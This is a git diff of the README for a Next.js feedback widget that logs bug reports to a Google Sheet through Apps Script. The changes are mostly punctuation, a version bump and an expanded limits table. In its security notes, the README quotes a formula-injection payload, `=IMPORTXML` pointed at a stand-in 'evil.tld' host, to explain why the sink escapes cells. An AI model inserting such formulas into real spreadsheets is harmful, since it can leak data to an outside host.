@@ -4,7 +4,7 @@ An in-page feedback widget for Next.js. Someone reviewing your site clicks a
 button, types what broke and why it matters, and the report lands in a Google
 Sheet with the browser context already attached.
 
-No database. No third-party SaaS. No cookie banner - nothing is stored on the
+No database. No third-party SaaS. No cookie banner – nothing is stored on the
 client except a draft, the name the reporter typed, and an anonymous per-tab
 id, and the IP address is never written down.
 
@@ -13,7 +13,7 @@ broken"* with a row that says which page, which browser, which viewport, and
 what the console was throwing at the time.
 
 ```
-browser - shadow DOM, second React root
+browser – shadow DOM, second React root
    │
    │  POST /api/feedback
    │  { schemaVersion, project, type, severity, what, why, reporter, context }
@@ -22,7 +22,7 @@ Next.js route handler
    │  honeypot · rate limit · validate · re-derive UA from raw · redact query values
    │  injects: token · environment · country · commit SHA
    │
-   │  POST (redirect: follow - Apps Script answers 302)
+   │  POST (redirect: follow – Apps Script answers 302)
    ▼
 Apps Script /exec
    │  token check · validate · LockService · escape leading =+-@ · redact query values
@@ -35,7 +35,7 @@ Google Sheet
 ## Install
 
 ```bash
-npm i github:marcin-laskowski/feedback#v0.2.1
+npm i github:marcin-laskowski/feedback#v0.2.2
 ```
 
 The package ships TypeScript source and is compiled by the host app:
@@ -66,7 +66,7 @@ export const maxDuration = 20; // route segment config must live in the route fi
 ```
 
 `<FeedbackErrorInit />` goes in the layout, above everything else. It starts the
-console-error buffer, which has to be listening *before* the errors happen - a
+console-error buffer, which has to be listening *before* the errors happen – a
 buffer that starts when the panel opens only ever captures the errors that came
 after the user noticed the bug.
 
@@ -94,7 +94,7 @@ FEEDBACK_SINK_TOKEN=…
 ```
 
 Neither may ever reach the browser, which is why the warm-up ping is a `GET` on
-your own route rather than a fetch straight at the sink - the widget cannot know
+your own route rather than a fetch straight at the sink – the widget cannot know
 the sink's address.
 
 Setting up the sink takes about 30 minutes and is documented in
@@ -121,7 +121,7 @@ Two things about that sheet are load-bearing:
 
 - **Rows are written by header NAME, not by column index.** Reordering columns
   is safe. *Renaming* a header silently empties that column for every future
-  report - protect the `reports` tab and put human-readable labels in the
+  report – protect the `reports` tab and put human-readable labels in the
   `board` view instead.
 - **Every text cell is escaped** if it starts with `=`, `+`, `-`, `@`, or a
   control character. A report containing `=IMPORTXML("https://evil.tld","//a")`
@@ -132,7 +132,7 @@ Two things about that sheet are load-bearing:
 - The endpoint is protected by a **shared secret, not by obscurity.** Publishing
   `Code.gs` costs nothing; publishing the token would cost everything. It lives
   in Apps Script Script Properties and in your host's environment, never in git.
-- **The query string is never rendered** in the widget's context strip - a URL
+- **The query string is never rendered** in the widget's context strip – a URL
   can be `/reset-password?token=eyJ…`, and the strip is on screen next to
   whoever is standing behind the reporter.
 - **Query values on a denylist are redacted** (`token`, `key`, `secret`,
@@ -149,14 +149,15 @@ Two things about that sheet are load-bearing:
   remembered in `localStorage` so it is typed once per browser. It is the only
   identity the widget holds, and it is whatever the reporter chose to type.
 - `type` and `severity` are still in the contract and the sheet, but the form
-  no longer asks for them - every report carries `bug` / `annoying`.
+  no longer asks for them – every report carries `bug` / `annoying`.
 
 ## Accepted limits
 
 | Limit | Why it is fine |
 |---|---|
-| No rate limiting in the sink | The route handler limits per IP, plus a honeypot. The sink is not public - only your server knows its address. |
-| No idempotency | Submit is synchronous with no auto-retry, and `redirect: "follow"` removes the duplicate-row cause. |
+| No rate limiting in the sink | The route handler limits per IP, plus a honeypot. The sink is not public – only your server knows its address. |
+| No idempotency | Submit is synchronous with no auto-retry, so a duplicate needs a human to press send twice. That can happen: when the route gives up on the sink after 14 s the Apps Script run keeps going and may still write the row, and the panel says the send was not confirmed. Accepted for a sheet a human reads. |
+| One write at a time | The sink holds a script-wide lock around the append. A report arriving while another is being written waits up to 3 s, then gets `busy`, and the panel asks the reporter to try again in a few seconds. Nothing is written on `busy`. |
 | No `schemaVersion` negotiation | The field is stored; nothing branches on it yet. |
 | Cold start 1-3 s | The warm-up ping on panel open covers it. |
 | In-memory rate limit | Per serverless instance, best-effort. Fine for a tool with three reporters. |
@@ -172,7 +173,7 @@ apps-script/   the sink: Code.gs, appsscript.json, setup guide
 ```
 
 `shared/` is the reason the client and the server agree on what a valid report
-is. Validation runs in both - in the browser so the reporter gets a highlighted
+is. Validation runs in both – in the browser so the reporter gets a highlighted
 field, on the server so a crafted request cannot skip it.
 
 ## Development
@@ -186,4 +187,4 @@ There is no build step. Next compiles the source through `transpilePackages`.
 
 ## Licence
 
-MIT - see [LICENSE](LICENSE).
+MIT – see [LICENSE](LICENSE).
